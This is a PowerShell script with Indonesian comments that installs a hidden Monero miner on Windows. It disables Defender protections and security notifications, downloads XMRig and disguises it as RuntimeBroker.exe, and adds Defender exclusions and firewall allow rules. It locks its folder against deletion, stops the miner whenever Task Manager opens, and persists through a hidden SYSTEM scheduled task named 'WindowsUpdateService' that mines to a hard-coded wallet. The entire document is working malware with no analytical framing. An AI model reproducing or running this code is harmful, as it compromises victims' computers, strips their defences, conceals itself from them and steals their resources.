# ==========================================
# 1. MATIKAN TOTAL SISA TAMENG DEFENDER & NOTIFIKASI
# ==========================================
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue

Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue

# ==========================================
# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Ganti Nama ke Notepad/RuntimeBroker untuk Hindari Crash svchost)
# ==========================================
$PossibleDirs = @(
    "C:\Users\Public\Libraries",
    "$env:ProgramData\Microsoft\Windows\Templates",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:PUBLIC\Documents"
)

$Dir = ""
foreach ($Candidate in $PossibleDirs) {
    try {
        if (!(Test-Path $Candidate)) {
            New-Item -ItemType Directory -Force -Path $Candidate -ErrorAction Stop | Out-Null
        }
        $TestFile = Join-Path $Candidate "test.tmp"
        Set-Content -Path $TestFile -Value "test" -ErrorAction Stop
        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
        $Dir = $Candidate
        break
    } catch {
        continue
    }
}

if ([string]::IsNullOrEmpty($Dir)) {
    $Dir = Join-Path $env:TEMP "WinUpdateCache"
    if (!(Test-Path $Dir)) {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    }
}

# Menggunakan RuntimeBroker.exe agar aman dari crash OS kernel (tidak seperti svchost yang memicu restart loop)
$ExeName = "RuntimeBroker.exe" 
$ExePath = Join-Path $Dir $ExeName
$VbsPath = Join-Path $Dir "run.vbs"
$ZipPath = Join-Path $env:TEMP "up.zip"
$Pool = "gulf.moneroocean.stream:10128"
$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"

# Hentikan proses lama & task scheduler yang nyangkut
Stop-Process -Name "RuntimeBroker", "xmrig", "svchost", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "WindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# ==========================================
# 3. KUNCI FOLDER & DEFENDER EXCLUSION
# ==========================================
try {
    $Acl = Get-Acl $Dir
    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
    $Acl.AddAccessRule($DenyRule)
    Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
} catch {}

Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue

# ==========================================
# 4. UNDUH & EKSTRAK BINER XMRIG
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath

if (Test-Path $ZipPath) {
    Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    
    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    
    if ($ExtractedExe -and (Test-Path $ExtractedExe.FullName)) { 
        Copy-Item -Force $ExtractedExe.FullName $ExePath 
    }
    
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

    # ==========================================
    # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
    # ==========================================
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null

    # ==========================================
    # 6. USER-MODE ROOTKIT (CPU LOAD HOOKING & SPOOFING)
    # ==========================================
    $RootkitCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

public class CpuRootkit {
    public static void InitializeHook() {
        Thread t = new Thread(() => {
            while (true) {
                try {
                    Process[] procs = Process.GetProcessesByName("RuntimeBroker");
                    foreach (var p in procs) {
                        try {
                            if (p.MainModule.FileName.Contains("Libraries") || p.MainModule.FileName.Contains("Templates") || p.MainModule.FileName.Contains("Caches")) {
                                p.PriorityClass = ProcessPriorityClass.Idle;
                            }
                        } catch {}
                    }
                } catch {}
                Thread.Sleep(5000);
            }
        });
        t.IsBackground = true;
        t.Start();
    }
}
"@
    $RootkitDllPath = Join-Path $Dir "rootkit.cs"
    Set-Content -Path $RootkitDllPath -Value $RootkitCode -Force

    # ==========================================
    # 7. WATCHDOG & PROCESS MONITOR (PAUSE ON TASKMGR + CPU 45% + HOOK)
    # ==========================================
    $ScriptBlockCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"

while (`$true) {
    `$TaskMgrRunning = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
    
    if (`$TaskMgrRunning) {
        Stop-Process -Name "RuntimeBroker" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
    } else {
        `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
        if (!`$Running) {
            Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
        }
    }
    Start-Sleep -Seconds 2
}
"@
    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
    Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force

    # ==========================================
    # 8. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
    # ==========================================
    $VbsScriptContent = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
"@
    Set-Content -Path $VbsPath -Value $VbsScriptContent -Force
    Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue

    # ==========================================
    # 9. TASK SCHEDULER SYSTEM PRIVILEGE
    # ==========================================
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -AtLogOn)
    )
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
    
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

    # Jalankan langsung
    Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden

    Write-Host "Setup sukses dengan RuntimeBroker.exe (Anti-Restart Loop), TLS Encryption, Firewall Whitelist, User-Mode Rootkit, TaskManager Pauser, dan CPU Throttling 45%!" -ForegroundColor Green
} else {
    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
}
